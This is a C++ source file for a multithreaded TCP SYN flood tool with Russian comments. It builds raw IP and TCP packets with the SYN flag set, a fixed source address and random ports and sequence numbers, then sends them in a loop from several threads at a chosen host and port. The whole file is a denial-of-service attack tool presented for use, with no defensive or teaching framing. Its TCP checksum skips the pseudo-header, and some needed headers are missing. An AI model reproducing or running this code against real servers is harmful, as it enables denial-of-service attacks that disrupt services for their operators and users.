#include "TcpSynFlood.h"
#include <iostream>
#include <cstring>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <cstdlib>

// TCP заголовок
struct TcpHeader {
    uint16_t sourcePort;
    uint16_t destPort;
    uint32_t seqNumber;
    uint32_t ackNumber;
    uint8_t dataOffset;
    uint8_t flags;
    uint16_t windowSize;
    uint16_t checksum;
    uint16_t urgentPointer;
};

// IP заголовок
struct IpHeader {
    uint8_t versionAndIhl;
    uint8_t typeOfService;
    uint16_t totalLength;
    uint16_t id;
    uint16_t fragmentOffset;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    uint32_t sourceIp;
    uint32_t destIp;
};

TcpSynFlood::TcpSynFlood(const std::string& host, uint16_t port, size_t threads, size_t packets)
    : targetHost(host), targetPort(port), threadCount(threads), packetCount(packets) {}

uint16_t TcpSynFlood::checksum(void* data, int len) {
    uint32_t sum = 0;
    uint16_t* ptr = static_cast<uint16_t*>(data);

    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(uint8_t*)ptr;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return ~sum;
}

void TcpSynFlood::performFlood() {
    int rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (rawSocket < 0) {
        perror("Raw socket creation failed");
        return;
    }

    int opt = 1;
    setsockopt(rawSocket, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in targetAddr;
    targetAddr.sin_family = AF_INET;
    targetAddr.sin_port = htons(targetPort);
    inet_pton(AF_INET, targetHost.c_str(), &targetAddr.sin_addr);

    char packet[4096];
    memset(packet, 0, sizeof(packet));

    struct IpHeader* ipHeader = (struct IpHeader*)packet;
    struct TcpHeader* tcpHeader = (struct TcpHeader*)(packet + sizeof(struct IpHeader));

    for (size_t i = 0; i < packetCount; ++i) {
        ipHeader->versionAndIhl = (4 << 4) | (sizeof(IpHeader) / 4);
        ipHeader->typeOfService = 0;
        ipHeader->totalLength = htons(sizeof(IpHeader) + sizeof(TcpHeader));
        ipHeader->id = htons(rand());
        ipHeader->fragmentOffset = 0;
        ipHeader->ttl = 64;
        ipHeader->protocol = IPPROTO_TCP;
        inet_pton(AF_INET, "192.168.1.100", &ipHeader->sourceIp);
        ipHeader->destIp = targetAddr.sin_addr.s_addr;
        ipHeader->checksum = checksum(ipHeader, sizeof(IpHeader));

        tcpHeader->sourcePort = htons(rand() % 65535);
        tcpHeader->destPort = htons(targetPort);
        tcpHeader->seqNumber = rand();
        tcpHeader->ackNumber = 0;
        tcpHeader->dataOffset = (sizeof(TcpHeader) / 4) << 4;
        tcpHeader->flags = 0x02; // SYN
        tcpHeader->windowSize = htons(8192);
        tcpHeader->checksum = 0;
        tcpHeader->urgentPointer = 0;

        tcpHeader->checksum = checksum(tcpHeader, sizeof(TcpHeader));

        sendto(rawSocket, packet, sizeof(IpHeader) + sizeof(TcpHeader), 0,
               (struct sockaddr*)&targetAddr, sizeof(targetAddr));
    }

    close(rawSocket);
}

void TcpSynFlood::start() {
    std::vector<std::thread> threads;
    for (size_t i = 0; i < threadCount; ++i) {
        threads.emplace_back([this]() { this->performFlood(); });
    }

    for (auto& thread : threads) {
        thread.join();
    }
}
